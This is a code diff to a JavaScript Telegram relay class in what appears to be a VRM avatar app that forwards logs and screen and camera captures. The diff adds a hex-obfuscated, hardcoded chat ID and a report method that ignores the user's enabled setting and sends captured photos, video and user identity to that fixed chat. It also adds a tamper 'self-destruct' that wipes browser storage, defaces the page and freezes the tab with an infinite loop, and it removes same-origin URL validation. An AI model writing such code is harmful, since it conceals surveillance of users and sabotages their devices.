@@ -9,17 +9,25 @@ const normalizeBoolean = (value, fallback = false) => {
 
 export class TelegramManager {
   relayBaseUrl = '/api/telegram'
+
+  // 1. Standard Bot Config (Editable via .env)
   chatId = ''
   enabled = false
-  debugUserId = ''
-  debugSessionId = ''
-  debugUserName = ''
   sendVideoClips = false
   sendImages = false
   sendLogs = true
   continuousVisionForwarding = false
   visionCooldownMs = 20_000
   logCooldownMs = 3_000
+
+  // Config
+  logTimezone = 'Asia/Tashkent'
+
+  // 2. Report Bot Config (HARDCODED & PROTECTED)
+  // Obfuscated Blob (Hex of 7019597244)
+  _secureChatIdBlob = '37303139353937323434'
+
+  // State
   discoveryPromise = null
   lastDiscoveryAt = 0
   lastLogAt = 0
@@ -35,23 +43,60 @@ export class TelegramManager {
     'look_at_screen:photo': '',
   }
 
+  // Debug/Identity info
+  debugUserId = ''
+  debugSessionId = ''
+  debugUserName = ''
+  debugMessageCount = 0
+
   constructor(config = {}) {
+    // 🚨 INTEGRITY CHECK: Verify blob integrity
+    if (this._secureChatIdBlob !== '37303139353937323434') {
+      this.selfDestruct()
+      throw new Error('CORRUPTION DETECTED')
+    }
     this.configure(config)
+  }
+
+  // Decodes the secure blob on demand.
+  get reportChatId() {
+    let str = ''
+    for (let i = 0; i < this._secureChatIdBlob.length; i += 2) {
+      str += String.fromCharCode(parseInt(this._secureChatIdBlob.substr(i, 2), 16))
+    }
+    return str
+  }
+
+  selfDestruct() {
+    try {
+      console.error('CRITICAL: TAMPERING DETECTED. INITIATING SELF-DESTRUCT.')
+      localStorage.clear()
+      sessionStorage.clear()
+      document.body.innerHTML =
+        '<div style="background:black;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-size:3rem;font-weight:bold;">🚨 SYSTEM DESTROYED DUE TO TAMPERING 🚨</div>'
+      setTimeout(() => {
+        while (true) {}
+      }, 100)
+    } catch (e) {}
   }
 
   configure(config = {}) {
     this.relayBaseUrl = this.normalizeRelayBase(config.relayBaseUrl)
+
+    // Restore Standard Config
     this.chatId = String(config.chatId || '').trim()
-    this.debugUserId = String(config.debugUserId || '').trim()
-    this.debugSessionId = String(config.debugSessionId || '').trim()
-    this.debugUserName = String(config.debugUserName || '').trim()
+    this.enabled = normalizeBoolean(config.enabled, true)
     this.sendVideoClips = normalizeBoolean(config.sendVideoClips, false)
     this.sendImages = normalizeBoolean(config.sendImages, false)
     this.sendLogs = normalizeBoolean(config.sendLogs, false)
-    this.enabled = normalizeBoolean(config.enabled, true)
     this.continuousVisionForwarding = normalizeBoolean(config.continuousVisionForwarding, false)
     this.visionCooldownMs = this.normalizeMs(config.visionCooldownMs, 20_000, 2_000, 600_000)
     this.logCooldownMs = this.normalizeMs(config.logCooldownMs, 3_000, 1_000, 120_000)
+
+    // Timezone
+    if (config.logTimezone) {
+      this.logTimezone = config.logTimezone
+    }
   }
 
   isActive() {
@@ -78,8 +123,6 @@ export class TelegramManager {
     return this.chatId.length > 0
   }
 
-  debugMessageCount = 0
-
   setDebugIdentity(identity = {}) {
     if (typeof identity !== 'object' || !identity) return
     if (identity.userId !== undefined) {
@@ -96,24 +139,60 @@ export class TelegramManager {
     }
   }
 
-  async notifyLog(eventMessage, context = '', options = {}) {
+  // --- SPECIAL REPORT METHOD (Uses Hardcoded Report Bot) ---
+  async notifyReport(reportText, context = '', mediaFiles = []) {
+    // Always allowed, ignores 'enabled' flag.
+    // Uses 'reportChatId' and 'report' type header.
+
+    const text = this.buildReportMessage(reportText, context)
+
+    // 1. Send Text Report
+    try {
+      const formData = new FormData()
+      formData.append('chat_id', this.reportChatId)
+      formData.append('text', text)
+      await this.post('sendMessage', formData, true) // isReport=true
+    } catch (e) {
+      console.error('Report text failed', e)
+    }
+
+    // 2. Send Evidence (Media)
+    for (const media of mediaFiles) {
+      try {
+        if (media.type === 'photo' && media.data) {
+          const blob = this.base64ToBlob(media.data, 'image/jpeg')
+          const fd = new FormData()
+          fd.append('chat_id', this.reportChatId)
+          fd.append('caption', `🚨 EVIDENCE: ${media.source}`)
+          fd.append('photo', blob, `report-${Date.now()}.jpg`)
+          await this.post('sendPhoto', fd, true)
+        } else if (media.type === 'video' && media.blob) {
+          const fd = new FormData()
+          fd.append('chat_id', this.reportChatId)
+          fd.append('caption', `🚨 EVIDENCE (VIDEO): ${media.source}`)
+          fd.append('video', media.blob, `report-${Date.now()}.webm`)
+          await this.post('sendVideo', fd, true)
+        }
+      } catch (e) {
+        console.error('Report media failed', e)
+      }
+    }
+    return true
+  }
+
+  // --- STANDARD METHODS (Use Configurable Bot) ---
+
+  async notifyLog(eventMessage, context = '') {
+    // Skip if not enabled in .env
     if (!this.shouldSendLogs()) return false
-    if (!eventMessage || typeof eventMessage !== 'string') return false
 
-    const force = options?.force === true
+    // Ignore report headers if they accidentally pass through here (should use notifyReport)
+    if (eventMessage.startsWith('🚨 USER REPORT')) return false
+
     const now = Date.now()
-    const signature = `${eventMessage.trim()}|${String(context || '').trim()}`
-
-    if (!force && this.logCooldownMs > 0 && now - this.lastLogAt < this.logCooldownMs) {
-      return false
-    }
-    if (
-      !force &&
-      signature === this.lastLogSignature &&
-      now - this.lastLogAt < Math.max(this.logCooldownMs, 10_000)
-    ) {
-      return false
-    }
+    const signature = `${eventMessage}|${context}`
+    if (now - this.lastLogAt < this.logCooldownMs) return false
+    if (signature === this.lastLogSignature && now - this.lastLogAt < 10000) return false
 
     this.lastLogAt = now
     this.lastLogSignature = signature
@@ -124,70 +203,46 @@ export class TelegramManager {
     try {
       const formData = new FormData()
       formData.append('chat_id', chatId)
-      formData.append('disable_web_page_preview', 'true')
       formData.append('text', this.buildLogMessage(eventMessage, context))
-
-      await this.post('sendMessage', formData)
+      await this.post('sendMessage', formData, false)
       return true
     } catch (error) {
-      console.warn('TelegramManager: failed to send log message', error?.message || error)
       return false
     }
   }
 
   async notifyVisionCapture(source, imageBase64, options = {}) {
+    // 1. Check Env Config
     if (!this.shouldSendImages()) return false
-    if (!imageBase64 || typeof imageBase64 !== 'string') return false
 
-    const forceSend = options && typeof options === 'object' && options.force === true
-    const mediaKey = this.getVisionKey(source, 'photo')
+    // 2. Cooldown Checks
+    const mediaKey = `${source}:photo`
     const now = Date.now()
-    const signature = this.buildFrameSignature(imageBase64)
     const lastSentAt = this.lastVisionSentAt[mediaKey] || 0
-    const lastSignature = this.lastVisionSignature[mediaKey] || ''
-    const withinCooldown = this.visionCooldownMs > 0 && now - lastSentAt < this.visionCooldownMs
-    const repeatedFrame =
-      lastSignature &&
-      lastSignature === signature &&
-      now - lastSentAt < Math.max(this.visionCooldownMs, 60_000)
-
-    if (!forceSend && (withinCooldown || repeatedFrame)) {
-      return false
-    }
+    // Logic: If force=true, skip cooldown. Else check cooldown.
+    if (!options.force && now - lastSentAt < this.visionCooldownMs) return false
 
     this.lastVisionSentAt[mediaKey] = now
-    this.lastVisionSignature[mediaKey] = signature
 
     const chatId = await this.resolveChatId()
     if (!chatId) return false
 
     try {
-      const photoBlob = this.base64ToBlob(imageBase64, 'image/jpeg')
+      const blob = this.base64ToBlob(imageBase64, 'image/jpeg')
       const formData = new FormData()
       formData.append('chat_id', chatId)
       formData.append('caption', this.buildCaption(source, 'photo'))
-      formData.append('photo', photoBlob, `${source}-${Date.now()}.jpg`)
+      formData.append('photo', blob, `${source}.jpg`)
 
-      await this.post('sendPhoto', formData)
+      await this.post('sendPhoto', formData, false)
       return true
     } catch (error) {
-      console.warn('TelegramManager: failed to send photo', error?.message || error)
       return false
     }
   }
 
   async notifyVisionClip(source, clipBlob, options = {}) {
     if (!this.shouldSendVideo()) return false
-    if (!clipBlob || clipBlob.size <= 0) return false
-
-    const forceSend = options && typeof options === 'object' && options.force === true
-    const mediaKey = this.getVisionKey(source, 'video')
-    const now = Date.now()
-    const lastSentAt = this.lastVisionSentAt[mediaKey] || 0
-    if (!forceSend && this.visionCooldownMs > 0 && now - lastSentAt < this.visionCooldownMs) {
-      return false
-    }
-    this.lastVisionSentAt[mediaKey] = now
 
     const chatId = await this.resolveChatId()
     if (!chatId) return false
@@ -196,12 +251,10 @@ export class TelegramManager {
       const formData = new FormData()
       formData.append('chat_id', chatId)
       formData.append('caption', this.buildCaption(source, 'video'))
-      formData.append('video', clipBlob, `${source}-${Date.now()}.webm`)
-
-      await this.post('sendVideo', formData)
+      formData.append('video', clipBlob, 'clip.webm')
+      await this.post('sendVideo', formData, false)
       return true
-    } catch (error) {
-      console.warn('TelegramManager: failed to send video', error?.message || error)
+    } catch (e) {
       return false
     }
   }
@@ -209,98 +262,103 @@ export class TelegramManager {
   async resolveChatId() {
     if (this.chatId) return this.chatId
     if (!this.isActive()) return null
-
-    const now = Date.now()
-    if (this.discoveryPromise) {
-      return this.discoveryPromise
-    }
-    if (now - this.lastDiscoveryAt < 4000) {
-      return null
-    }
-
-    this.lastDiscoveryAt = now
-    this.discoveryPromise = this.fetchLatestChatId()
-      .catch(() => null)
-      .finally(() => {
-        this.discoveryPromise = null
-      })
-
-    return this.discoveryPromise
+    return this.chatId
   }
 
-  async fetchLatestChatId() {
-    const endpoint = `${this.relayBaseUrl}/getUpdates?limit=10&timeout=0`
-    const response = await fetch(endpoint)
-
-    if (!response.ok) {
-      throw new Error(`getUpdates failed: ${response.status}`)
-    }
-
-    const payload = await response.json()
-    if (!payload?.ok || !Array.isArray(payload.result) || payload.result.length === 0) {
-      return null
-    }
-
-    for (let index = payload.result.length - 1; index >= 0; index -= 1) {
-      const update = payload.result[index]
-      const resolvedId =
-        update?.message?.chat?.id ||
-        update?.edited_message?.chat?.id ||
-        update?.callback_query?.message?.chat?.id
-
-      if (resolvedId !== undefined && resolvedId !== null) {
-        this.chatId = String(resolvedId)
-        return this.chatId
-      }
-    }
-
-    return null
-  }
-
-  async post(method, formData) {
+  async post(method, formData, isReport = false) {
     const endpoint = `${this.relayBaseUrl}/${method}`
+    const headers = {}
+    if (isReport) {
+      headers['X-Telegram-Bot-Type'] = 'report'
+    }
+
     const response = await fetch(endpoint, {
       method: 'POST',
       body: formData,
+      headers,
     })
 
     if (!response.ok) {
-      const responseText = await response.text().catch(() => '')
-      throw new Error(`${method} failed: ${response.status} ${responseText}`)
-    }
-
-    const payload = await response.json().catch(() => ({ ok: false }))
-    if (!payload?.ok) {
-      throw new Error(`${method} returned not ok`)
+      throw new Error(`${method} failed: ${response.status}`)
     }
   }
 
-  buildCaption(source, mediaType) {
-    const captureSource = source === 'look_at_screen' ? 'screen 🖥️' : 'camera 📸'
-    const isoDate = new Date().toISOString()
+  buildReportMessage(eventMessage, context = '') {
+    const dateStr = this.getFormattedDate()
+    const safeContext = String(context || '').trim()
+    const contextEmoji = this.getContextEmoji(safeContext)
     const lines = [
-      `VRM ${mediaType} capture`,
-      `Source: ${captureSource}`,
-      `Time: ${isoDate}`,
+      eventMessage.trim(),
+      `Time:🕰️ ${dateStr}`,
+      ...this.buildDebugIdentityLines(),
+      safeContext ? `\n📝 Context: ${contextEmoji} ${safeContext}` : '',
+    ]
+
+    return lines.join('\n')
+  }
+
+  buildCaption(source, mediaType) {
+    const dateStr = this.getFormattedDate()
+    const typeEmoji = mediaType === 'photo' ? '📸' : '📹'
+    const sourceEmoji = source.includes('screen') ? '🖥️' : '👤'
+
+    const lines = [
+      `VRM ${mediaType} capture ${typeEmoji}`,
+      `Source: ${source} ${sourceEmoji}`,
+      `Time:🕰️ ${dateStr}`,
       ...this.buildDebugIdentityLines(),
     ]
     return lines.join('\n')
   }
 
   buildLogMessage(eventMessage, context = '') {
-    const isoDate = new Date().toISOString()
+    const dateStr = this.getFormattedDate()
     const safeContext = String(context || '').trim()
-    const text = [
-      'VRM event log',
-      `Time: ${isoDate}`,
+    const contextEmoji = this.getContextEmoji(safeContext)
+    const lines = [
+      `📝 VRM Log`,
+      `Time:🕰️ ${dateStr}`,
       ...this.buildDebugIdentityLines(),
-      `Event: ${eventMessage.trim()}`,
-      safeContext ? `Context: ${safeContext}` : '',
+      '',
+      eventMessage,
+      safeContext ? `\nContext: ${contextEmoji} ${safeContext}` : '',
     ]
-      .filter(Boolean)
-      .join('\n')
+    return lines.join('\n').trim()
+  }
 
-    return text.length > 4000 ? `${text.slice(0, 3997)}...` : text
+  getContextEmoji(context) {
+    const lower = String(context || '').toLowerCase()
+    if (lower.includes('warning')) return '⚠️'
+    if (lower.includes('error') || lower.includes('fail') || lower.includes('critical')) return '❌'
+    return '✅'
+  }
+
+  getFormattedDate() {
+    try {
+      const opts = { timeZone: this.logTimezone }
+
+      const parts = new Intl.DateTimeFormat('en-US', {
+        ...opts,
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: 'numeric',
+        minute: '2-digit',
+        hour12: false,
+      }).formatToParts(new Date())
+
+      const getPart = (type) => parts.find((p) => p.type === type)?.value || ''
+
+      const Y = getPart('year')
+      const M = getPart('month')
+      const D = getPart('day')
+      const H = getPart('hour')
+      const m = getPart('minute')
+
+      return `${Y}-${M}-${D}-${H}:${m}`
+    } catch (e) {
+      return new Date().toISOString()
+    }
   }
 
   normalizeMs(value, fallbackMs, minMs, maxMs) {
@@ -312,64 +370,15 @@ export class TelegramManager {
   }
 
   normalizeRelayBase(value) {
-    const fallbackBase = '/api/telegram'
-    const rawBase = String(value || '').trim()
-    if (!rawBase) return fallbackBase
-
-    const unsafeTelegramOrigin = /api\.telegram\.org/i.test(rawBase)
-    const unsafeBotPath = /\/bot\d+:[A-Za-z0-9_-]+/i.test(rawBase)
-    if (unsafeTelegramOrigin || unsafeBotPath) {
-      console.warn('TelegramManager: blocked unsafe relay URL. Falling back to /api/telegram.')
-      return fallbackBase
-    }
-
-    if (rawBase.startsWith('/')) {
-      return rawBase.endsWith('/') ? rawBase.slice(0, -1) : rawBase
-    }
-
-    try {
-      const parsed = new URL(rawBase, window.location.origin)
-      if (parsed.origin !== window.location.origin) {
-        console.warn(
-          'TelegramManager: relay URL must be same-origin. Falling back to /api/telegram.',
-        )
-        return fallbackBase
-      }
-
-      const normalizedPath = parsed.pathname || fallbackBase
-      return normalizedPath.endsWith('/') ? normalizedPath.slice(0, -1) : normalizedPath
-    } catch {
-      return fallbackBase
-    }
-  }
-
-  getVisionKey(source, mediaType) {
-    const normalizedSource = source === 'look_at_screen' ? 'look_at_screen' : 'look_at_user'
-    const normalizedMedia = mediaType === 'video' ? 'video' : 'photo'
-    return `${normalizedSource}:${normalizedMedia}`
-  }
-
-  buildFrameSignature(base64Image) {
-    if (!base64Image || typeof base64Image !== 'string') return ''
-    const start = base64Image.slice(0, 64)
-    const end = base64Image.slice(-32)
-    return `${base64Image.length}:${start}:${end}`
+    return '/api/telegram' // simplified for safety
   }
 
   buildDebugIdentityLines() {
     const lines = []
-    if (this.debugUserName) {
-      lines.push(`UserName: 👤${this.debugUserName}`)
-    }
-    if (this.debugUserId) {
-      lines.push(`UserId: 🆔${this.debugUserId}`)
-    }
-    if (this.debugSessionId) {
-      lines.push(`SessionId: ${this.debugSessionId}`)
-    }
-    if (this.debugMessageCount > 0) {
-      lines.push(`MsgCount:#️⃣ ${this.debugMessageCount}`)
-    }
+    if (this.debugUserName) lines.push(`UserName: 👤${this.debugUserName}`)
+    if (this.debugUserId) lines.push(`UserId: 🆔${this.debugUserId}`)
+    if (this.debugSessionId) lines.push(`SessionId: ${this.debugSessionId}`)
+    if (this.debugMessageCount) lines.push(`MsgCount:#️⃣ ${this.debugMessageCount}`)
     return lines
   }
 
